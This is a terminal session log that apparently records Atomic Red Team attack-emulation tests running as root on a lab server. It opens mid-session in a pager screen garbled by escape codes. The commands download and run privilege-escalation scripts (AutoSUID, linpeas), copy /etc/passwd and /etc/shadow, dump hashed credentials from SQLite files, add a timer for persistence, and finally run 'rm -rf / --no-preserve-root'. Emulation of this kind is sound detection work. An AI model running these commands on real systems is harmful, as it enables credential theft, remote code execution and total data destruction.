-[19;1H  ESC-n             *  Repeat previous search, spanning files.[m
-[20;1H  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-[21;1H  ESC-u                Undo (toggle) search highlighting.[m
-[22;1H  ESC-U                Clear search highlighting.[m
-[23;1H  &[4mpattern[m          *  Display only matching lines.[m
-[24;1H[1;1H  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-[2;1H  ESC-}  ^RightArrow   Right to last column displayed.[m
-[3;1H  ESC-{  ^LeftArrow    Left  to first column.[m
-[4;1H  F                    Forward forever; like "tail -f".[m
-[5;1H  ESC-F                Like F but stop when search pattern is found.[m
-[6;1H  r  ^R  ^L            Repaint screen.[m
-[7;1H  R                    Repaint screen, discarding buffered input.[m
-[8;1H        ---------------------------------------------------[m
-[9;1H        Default "window" is the screen height.[m
-[10;1H        Default "half-window" is half of the screen height.[m
-[11;1H ---------------------------------------------------------------------------[m
-[12;1H[m
-[13;1H                          [1mSEARCHING[0m[m
-[14;1H[m
-[15;1H  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-[16;1H  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-[17;1H  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-[18;1H  N                 *  Repeat previous search in reverse direction.[m
-[19;1H  ESC-n             *  Repeat previous search, spanning files.[m
-[20;1H  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-[21;1H  ESC-u                Undo (toggle) search highlighting.[m
-[22;1H  ESC-U                Clear search highlighting.[m
-[23;1H  &[4mpattern[m          *  Display only matching lines.[m
-[24;1H[K[7mIgnore case in searches  (press RETURN)[m[24;1H[K[K[7mCannot write to "udo cat /etc/master.passwd > /tmp/T1003.008.txt"  (press RETURN)[m[24;1H[K[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-[1m~[0m
-& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K/[K[K[7mNothing to search  (press RETURN)[m[24;1H[K[K& [7mlines 68-68/68 (END)[m[K[K|mark: [K[7mMark not set  (press RETURN)[m[24;1H[K[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[K/[K[K[7mNothing to search  (press RETURN)[m[24;1H[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K|mark: [K[7mMark not set  (press RETURN)[m[24;1H[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K& [7mlines 68-68/68 (END)[m[K[K|mark: [K[7mMark not set  (press RETURN)[m[24;1H[K[K& [7mlines 68-68/68 (END)[m[K[K/[K[K[7mNothing to search  (press RETURN)[m[24;1H[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K& [7mlines 68-68/68 (END)[m[K[K[K& [7mlines 68-68/68 (END)[m[K[K/[Kuu[Kss[Krr[K//[Kll[Kii[Kbb[K//[Koo[Kss[K--[Krr[Kee[Kll[Kee[Kaa[Kss[Kee[K;;[K  [Ktt[Khh[Kee[Knn[K  [Kaa[Kpp[Ktt[K  [Kuu[Kpp[Kdd[K
-
-action:
-command:whoami
-response:
-root
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl --create-dirs https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh --output /home/atomic/T1059.004/src/AutoSUID.sh
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 22769  100 22769    0     0   129k      0 --:--:-- --:--:-- --:--:--  129k
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:chmod +x /home/atomic/T1059.004/src/AutoSUID.sh
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:bash /home/atomic/T1059.004/src/AutoSUID.sh
-response:
-
-[00;33m╔═══════════════════════════════════════════════════════════════════════════╗[00m
-[00;33m║									    ║[00m
-[00;33m║[00m[01;32m				  AutoSUID				    [00m[00;33m║[00m
-[00;33m║									    ║[00m
-[00;33m╚═══════════════════════════════════════════════════════════════════════════╝[00m
-
-[00;33m[ ! ] https://www.linkedin.com/in/IvanGlinkin/ | @glinkinivan[00m
-
-[00;33m[ ! ][00m Running the command to find SUID files
-[01;36m[ * * ][00m[01;32m find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null[00m
-
-
-action:
-command:whoami
-response:Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
-root
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:cp /bin/ls /tmp/evil-binary
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
-response:
-1+0 records in
-1+0 records out
-1 byte copied, 6.5529e-05 s, 15.3 kB/s
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
-response:
-1+0 records in
-1+0 records out
-1 byte copied, 6.6046e-05 s, 15.1 kB/s
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data
-response:
-1+0 records in
-1+0 records out
-1 byte copied, 6.5819e-05 s, 15.2 kB/s
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:echo ""
-response:
-
-
-action:
-command:auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
-response:auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
-[?2004lCommand 'auditctl' not found, but can be installed with:
-apt install auditd
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:auditctl -a always,exit -F arch=b32 -S execve -k CMDS
-response:
-Command 'auditctl' not found, but can be installed with:
-apt install auditd
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:whoami; ausearch -i --start now
-response:
-root
-Command 'ausearch' not found, but can be installed with:
-apt install auditd
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:echo "Install systemd on the machine."; exit 1;
-response:
-
-
-action:
-command:systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
-response:
-[0;1;31mFailed to start transient timer unit: Unit Atomic-Red-Team.timer already exists.[0m
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:pip install requests
-response:
-Command 'pip' not found, but can be installed with:
-apt install python3-pip
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:which_python=$(which python || which python3 || which python3.9 || which python2)
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
-response:
-
-
-action:
-command:echo "Install netstat on the machine."; exit 1;
-response:
-[1;34m          linpeas-ng [1;33mby carlospolop
-[0m
-[1;33mADVISORY: [1;34mThis script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
-[0m
-[1;34mLinux Privesc Checklist: [1;33mhttps://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
-[0m [1;4mLEGEND[0m:
-  [1;31;103mRED/YELLOW[0m: 95% a PE vector
-  [1;31mRED[0m: You should take a look to it
-  [1;96mLightCyan[0m: Users with console
-  [1;34mBlue[0m: Users without console & mounted devs
-  [1;32mGreen[0m: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
-  [1;95mLightMagenta[0m: Your username
-
-  [1;31;103mYOU ARE ALREADY ROOT!!![0m (it could take longer to complete execution)
-
- [1;90mStarting linpeas. Caching Writable Folders...[0m
-
-[1;34m                                         ╔═══════════════════╗
-═════════════════════════════════════════╣ [1;32mBasic information[1;34m ╠═════════════════════════════════════════
-[1;34m                                         ╚═══════════════════╝[0m
-[1;37mOS: [0mLinux version 5.15.0-101-generic (buildd@lcy02-amd64-032) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
-[1;37mUser & Groups: [0muid=0[1;31m([1;95mroot[0m)[0m gid=0[1;31m([1;95mroot[0m)[0m groups=0[1;31m([1;95mroot[0m)[0m
-[1;37mHostname: [0mpairlab-vserver
-[1;37mWritable folder: [0m/dev/shm
-[1;33m[+] [1;32m/usr/bin/ping[1;34m is available for network discovery[1;37m (linpeas can discover hosts, learn more with -h)
-[0m[1;33m[+] [1;32m/usr/bin/nc[1;34m is available for network discover & port scanning[1;37m (linpeas can discover hosts and scan ports, learn more with -h)
-[0m
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-[?2004hroot@pairlab-vserver:~# 
-
-
-action:
-command:netstat
-response:
-Command 'netstat' not found, but can be installed with:
-apt install net-tools
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:who -a
-response:
-           system boot  2025-03-11 15:02
-LOGIN      tty1         2025-03-11 15:02               712 id=tty1
-           run-level 5  2025-03-11 15:02
-root     + pts/0        2025-03-13 15:20   .         29463 (192.168.4.1)
-           pts/1        2025-03-13 15:20             29536 id=ts/1  term=0 exit=0
-           pts/2        2025-03-13 15:12             26572 id=ts/2  term=0 exit=0
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
-response:
-[1] 29640
-Traceback (most recent call last):
-  File "/usr/lib/python3.10/runpy.py", line 196, in _run_module_as_main
-    return _run_code(code, main_globals, None,
-  File "/usr/lib/python3.10/runpy.py", line 86, in _run_code
-    exec(code, run_globals)
-  File "/usr/lib/python3.10/http/server.py", line 1307, in <module>
-    test(
-  File "/usr/lib/python3.10/http/server.py", line 1258, in test
-    with ServerClass(addr, HandlerClass) as httpd:
-  File "/usr/lib/python3.10/socketserver.py", line 452, in __init__
-    self.server_bind()
-  File "/usr/lib/python3.10/http/server.py", line 1301, in server_bind
-    return super().server_bind()
-  File "/usr/lib/python3.10/http/server.py", line 137, in server_bind
-    socketserver.TCPServer.server_bind(self)
-  File "/usr/lib/python3.10/socketserver.py", line 466, in server_bind
-    self.socket.bind(self.server_address)
-OSError: [Errno 98] Address already in use
-
-
-action:
-command:testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
-response:testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
-[1]+  Exit 1                  python3 -m http.server 9090
--bash: kill: (29640) - No such process
-[?2004hroot@pairlab-vserver:/tmp# testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
-[?2004l[?2004hroot@pairlab-vserver:/tmp# 
-
-action:
-command:[ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
-response:
-[?2004hroot@pairlab-vserver:/tmp# 
-
-action:
-command:testcat /etc/passwd
-response:
-[?2004hroot@pairlab-vserver:/tmp# 
-
-action:
-command:testcat /etc/shadow
-response:
-[?2004hroot@pairlab-vserver:/tmp# 
-
-action:
-command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
-response:
-[33m0% [Working][0m            Hit:1 http://tw.archive.ubuntu.com/ubuntu jammy InRelease
-[33m0% [Connecting to security.ubuntu.com (91.189.91.82)][0m                                                     Hit:2 http://tw.archive.ubuntu.com/ubuntu jammy-updates InRelease
-                                                     Hit:3 http://tw.archive.ubuntu.com/ubuntu jammy-backports InRelease
-[33m0% [Connecting to security.ubuntu.com (91.189.91.82)][0m[33m0% [Connecting to security.ubuntu.com (91.189.91.82)][0m[33m                                                     0% [Waiting for headers][0m[33m0% [Waiting for headers][0m                        Hit:4 http://security.ubuntu.com/ubuntu jammy-security InRelease
-[33m                        0% [Working][0m[33m20% [Working][0m             Reading package lists... 0%Reading package lists... 0%Reading package lists... 0%Reading package lists... 2%Reading package lists... 2%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 33%Reading package lists... 33%
-
-action:
-command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
-response:Reading package lists... 46%Reading package lists... 46%Reading package lists... 46%Reading package lists... 46%Reading package lists... 47%Reading package lists... 47%Reading package lists... 52%Reading package lists... 52%Reading package lists... 56%Reading package lists... 56%Reading package lists... 65%Reading package lists... 65%Reading package lists... 69%Reading package lists... 69%Reading package lists... 72%Reading package lists... 72%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 79%Reading package lists... 79%Reading package lists... 83%Reading package lists... 83%Reading package lists... 88%Reading package lists... 91%Reading package lists... 91%Reading package lists... 96%Reading package lists... 96%Reading package lists... 98%Reading package lists... 98%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... Done
-Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
-Reading state information... 0% Reading state information... 0%Reading state information... Done
-186 packages can be upgraded. Run 'apt list --upgradable' to see them.
-Reading package lists... 0%Reading package lists... 100%Reading package lists... Done
-Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
-Reading state information... 0% Reading state information... 0%Reading state information... Done
-binutils is already the newest version (2.38-4ubuntu2.7).
-curl is already the newest version (7.81.0-1ubuntu1.20).
-sqlite3 is already the newest version (3.37.2-2ubuntu0.3).
-0 upgraded, 0 newly installed, 0 to remove and 186 not upgraded.
-[?2004hroot@pairlab-vserver:/tmp# 
-[?2004hroot@pairlab-vserver:/tmp# 
-
-action:
-command:cd $HOME
-response:
-
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
-response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
-[?2004l  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  8192  100  8192    0     0  20226      0 --:--:-- --:--:-- --:--:-- 20277
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 12288  100 12288    0     0  75874      0 --:--:-- --:--:-- --:--:-- 76322
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   817  100   817    0     0   5239      0 --:--:-- --:--:-- --:--:--  5270
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:chmod +x sqlite_dump.sh
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
-response:
-./art
-List of tables:
-users
-Retrieving data from tables:
-Table: users
-1|bart@thesimpsons.com|32f8e0bb6944a6efe8b1351b72b8facc
-2|lisa@thesimpsons.com|bad6f1ca002d538211f2765e159c9c5f
-3|maggie@thesimpsons.com|88d4e59c78f144b9c793f60c97e8b02d
-4|marge@thesimpsons.com|c777e5de61c5b415b13b2bfc73395f9e
-
-./gta.db
-List of tables:
-releases
-cities
-Retrieving data from tables:
-Table: releases
-1997|Grand Theft Auto|state of New Guernsey
-1999|Grand Theft Auto 2|Anywhere, USA
-2001|Grand Theft Auto III|Liberty City
-2002|Grand Theft Auto: Vice City|Vice City
-2004|Grand Theft Auto: San Andreas|state of San Andreas
-2008|Grand Theft Auto IV|Liberty City
-2013|Grand Theft Auto V|Los Santos
-Table: cities
-Liberty City|New York
-
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
-response:
-[33m0% [Working][0m            Hit:1 http://tw.archive.ubuntu.com/ubuntu jammy InRelease
-[33m0% [Connecting to security.ubuntu.com (185.125.190.82)][0m                                                       Hit:2 http://tw.archive.ubuntu.com/ubuntu jammy-updates InRelease
-                                                       Hit:3 http://tw.archive.ubuntu.com/ubuntu jammy-backports InRelease
-[33m0% [Connecting to security.ubuntu.com (185.125.190.82)][0m[33m0% [Connecting to security.ubuntu.com (185.125.190.82)][0m[33m                                                       0% [Connecting to security.ubuntu.com (91.189.91.81)][0m[33m                                                     0% [Waiting for headers][0m                        Hit:4 http://security.ubuntu.com/ubuntu jammy-security InRelease
-[33m                        0% [Working][0m[33m20% [Working][0m             Reading package lists... 0%Reading package lists... 0%Reading package lists... 0%Reading package lists... 2%Reading package lists... 2%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%Reading package lists... 4%
-
-action:
-command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
-response:Reading package lists... 33%Reading package lists... 33%Reading package lists... 46%Reading package lists... 46%Reading package lists... 46%Reading package lists... 46%Reading package lists... 47%Reading package lists... 47%Reading package lists... 52%Reading package lists... 52%Reading package lists... 56%Reading package lists... 56%Reading package lists... 65%Reading package lists... 65%Reading package lists... 69%Reading package lists... 69%Reading package lists... 72%Reading package lists... 72%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 74%Reading package lists... 79%Reading package lists... 79%Reading package lists... 83%Reading package lists... 83%Reading package lists... 84%Reading package lists... 91%Reading package lists... 91%Reading package lists... 96%Reading package lists... 96%Reading package lists... 98%Reading package lists... 98%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... 99%Reading package lists... Done
-Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
-Reading state information... 0% Reading state information... 0%Reading state information... Done
-186 packages can be upgraded. Run 'apt list --upgradable' to see them.
-Reading package lists... 0%Reading package lists... 100%Reading package lists... Done
-Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
-Reading state information... 0% Reading state information... 0%Reading state information... Done
-binutils is already the newest version (2.38-4ubuntu2.7).
-curl is already the newest version (7.81.0-1ubuntu1.20).
-sqlite3 is already the newest version (3.37.2-2ubuntu0.3).
-if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
-0 upgraded, 0 newly installed, 0 to remove and 186 not upgraded.
-[?2004hroot@pairlab-vserver:~# if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
-[?2004l[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:cd $HOME
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  8192  100  8192    0     0  50141      0 --:--:-- --:--:-- --:--:-- 50257
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 12288  100 12288    0     0  77031      0 --:--:-- --:--:-- --:--:-- 77283
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
-response:
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   817  100   817    0     0   5071      0 --:--:-- --:--:-- --:--:--  5074
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:chmod +x sqlite_dump.sh
-response:
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
-response:
-./art
-List of tables:
-users
-Retrieving data from tables:
-Table: users
-1|bart@thesimpsons.com|32f8e0bb6944a6efe8b1351b72b8facc
-2|lisa@thesimpsons.com|bad6f1ca002d538211f2765e159c9c5f
-3|maggie@thesimpsons.com|88d4e59c78f144b9c793f60c97e8b02d
-4|marge@thesimpsons.com|c777e5de61c5b415b13b2bfc73395f9e
-
-./gta.db
-List of tables:
-releases
-cities
-Retrieving data from tables:
-Table: releases
-1997|Grand Theft Auto|state of New Guernsey
-1999|Grand Theft Auto 2|Anywhere, USA
-2001|Grand Theft Auto III|Liberty City
-2002|Grand Theft Auto: Vice City|Vice City
-2004|Grand Theft Auto: San Andreas|state of San Andreas
-2008|Grand Theft Auto IV|Liberty City
-2013|Grand Theft Auto V|Los Santos
-Table: cities
-Liberty City|New York
-
-[?2004hroot@pairlab-vserver:~# 
-
-action:
-command:[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
-response:
-
-
-action:
-command:echo "Install netstat on the machine."; exit 1;
-response:uname: command not found
-chflags: command not found
-[?2004hroot@pairlab-vserver:~# 
-
-
